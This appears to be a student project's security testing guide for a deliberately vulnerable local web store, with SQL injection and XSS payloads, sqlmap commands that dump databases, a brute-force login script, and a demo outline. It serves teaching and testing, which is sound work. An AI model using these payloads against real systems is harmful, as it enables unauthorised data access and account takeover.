# Security Testing Guide

## Quick Start

### 1. SQL Injection Testing

**Endpoint**: `http://localhost:8080/products/search-vulnerable?query=test`

**Manual Test**:
```
1. Basic injection:
   http://localhost:8080/products/search-vulnerable?query=' OR '1'='1

2. Expected result: Returns all products

3. Try union injection:
   http://localhost:8080/products/search-vulnerable?query=' UNION SELECT null,null,null,null,null,null,null,null,null,null--
```

**SQLmap Test**:
```bash
# Basic test
sqlmap -u "http://localhost:8080/products/search-vulnerable?query=test" --batch

# Enumerate databases
sqlmap -u "http://localhost:8080/products/search-vulnerable?query=test" --dbs --batch

# Dump tables
sqlmap -u "http://localhost:8080/products/search-vulnerable?query=test" -D funko_db --tables --batch
```

---

### 2. XSS Testing

**Page**: `http://localhost:3000/reviews`

**Test Steps**:
1. Navigate to reviews page
2. Enter name: `Test User`
3. Enter review: `<script>alert('XSS')</script>`
4. Submit review
5. Observe alert box appears

**More Payloads**:
```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<div onmouseover=alert('XSS')>Hover me</div>
<script>document.body.innerHTML='Hacked!'</script>
```

---

### 3. Weak Password Testing

**Endpoint**: `http://localhost:8080/api/auth/register`

**Test Steps**:
1. Try registering with password: `123`
2. Try registering with password: `password`
3. Try registering with password: `admin`
4. All should be accepted (vulnerability)

**Brute Force Test**:
```python
import requests

url = "http://localhost:8080/api/auth/login"
passwords = ["123456", "password", "admin", "12345678", "qwerty"]

for pwd in passwords:
    response = requests.post(url, params={
        "username": "testuser",
        "password": pwd
    })
    print(f"Password: {pwd} - Status: {response.status_code}")
```

---

## OWASP ZAP Testing

1. Download and install OWASP ZAP
2. Start ZAP
3. Configure browser proxy to `localhost:8080`
4. Navigate through application
5. Run automated scan
6. Review findings

---

## Presentation Demo Script

**Duration**: 10-12 minutes

### 1. Introduction (1 min)
"We implemented 3 vulnerabilities in our Funko Store application..."

### 2. SQL Injection Demo (3 min)
1. Show vulnerable code
2. Demonstrate payload: `' OR '1'='1`
3. Show SQLmap output
4. Explain impact

### 3. XSS Demo (3 min)
1. Show vulnerable code
2. Submit malicious review
3. Show script execution
4. Explain impact

### 4. Weak Password Demo (2 min)
1. Show code (no validation)
2. Register with weak password
3. Explain impact

### 5. Remediation (2 min)
1. Show secure code examples
2. Explain fixes

### 6. Conclusion (1 min)
"These vulnerabilities demonstrate importance of secure coding..."

---

## Documentation Checklist

- [x] Vulnerability report created
- [x] Testing guide created
- [x] Code vulnerabilities implemented
- [ ] Run OWASP ZAP scan
- [ ] Take screenshots
- [ ] Record demo video
- [ ] Prepare presentation slides
